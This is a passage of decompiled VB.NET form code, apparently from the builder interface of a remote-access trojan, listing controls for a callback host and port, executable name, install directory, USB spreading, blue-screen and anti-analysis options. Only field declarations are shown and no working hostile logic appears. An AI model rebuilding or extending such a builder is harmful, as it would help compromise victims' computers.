				Me.usbx.Enabled = False
			End If
		End Sub

		' Token: 0x0400004B RID: 75
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400004D RID: 77
		<AccessedThroughProperty("usbx")>
		Private _usbx As TextBox

		' Token: 0x0400004E RID: 78
		<AccessedThroughProperty("anti3")>
		Private _anti3 As TextBox

		' Token: 0x0400004F RID: 79
		<AccessedThroughProperty("RZ")>
		Private _RZ As CheckBox

		' Token: 0x04000050 RID: 80
		<AccessedThroughProperty("anti2")>
		Private _anti2 As CheckBox

		' Token: 0x04000051 RID: 81
		<AccessedThroughProperty("HD")>
		Private _HD As CheckBox

		' Token: 0x04000052 RID: 82
		<AccessedThroughProperty("Button5")>
		Private _Button5 As Button

		' Token: 0x04000053 RID: 83
		<AccessedThroughProperty("Button4")>
		Private _Button4 As Button

		' Token: 0x04000054 RID: 84
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x04000055 RID: 85
		<AccessedThroughProperty("usb")>
		Private _usb As CheckBox

		' Token: 0x04000056 RID: 86
		<AccessedThroughProperty("Label6")>
		Private _Label6 As Label

		' Token: 0x04000057 RID: 87
		<AccessedThroughProperty("klen")>
		Private _klen As NumericUpDown

		' Token: 0x04000058 RID: 88
		<AccessedThroughProperty("Isu")>
		Private _Isu As CheckBox

		' Token: 0x04000059 RID: 89
		<AccessedThroughProperty("Isf")>
		Private _Isf As CheckBox

		' Token: 0x0400005A RID: 90
		<AccessedThroughProperty("T1")>
		Private _T1 As TextBox

		' Token: 0x0400005B RID: 91
		<AccessedThroughProperty("bsod")>
		Private _bsod As CheckBox

		' Token: 0x0400005C RID: 92
		<AccessedThroughProperty("Label5")>
		Private _Label5 As Label

		' Token: 0x0400005D RID: 93
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x0400005E RID: 94
		<AccessedThroughProperty("CheckBox1")>
		Private _CheckBox1 As CheckBox

		' Token: 0x0400005F RID: 95
		<AccessedThroughProperty("Idr")>
		Private _Idr As CheckBox

		' Token: 0x04000060 RID: 96
		<AccessedThroughProperty("dir")>
		Private _dir As ComboBox

		' Token: 0x04000061 RID: 97
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x04000062 RID: 98
		<AccessedThroughProperty("exe")>
		Private _exe As TextBox

		' Token: 0x04000063 RID: 99
		<AccessedThroughProperty("GroupBox1")>
		Private _GroupBox1 As GroupBox

		' Token: 0x04000064 RID: 100
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x04000065 RID: 101
		<AccessedThroughProperty("VN")>
		Private _VN As TextBox

		' Token: 0x04000066 RID: 102
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000067 RID: 103
		<AccessedThroughProperty("port")>
		Private _port As NumericUpDown

		' Token: 0x04000068 RID: 104
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x04000069 RID: 105
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x0400006A RID: 106
		<AccessedThroughProperty("host")>
		Private _host As TextBox

		' Token: 0x0400006B RID: 107
		<AccessedThroughProperty("Lv1")>
		Private _Lv1 As LV

		' Token: 0x0400006C RID: 108
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x0400006D RID: 109
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x0400006E RID: 110
		<AccessedThroughProperty("task")>
		Private _task As CheckBox

		' Token: 0x0400006F RID: 111
		Private string_0 As String
	End Class
End Namespace
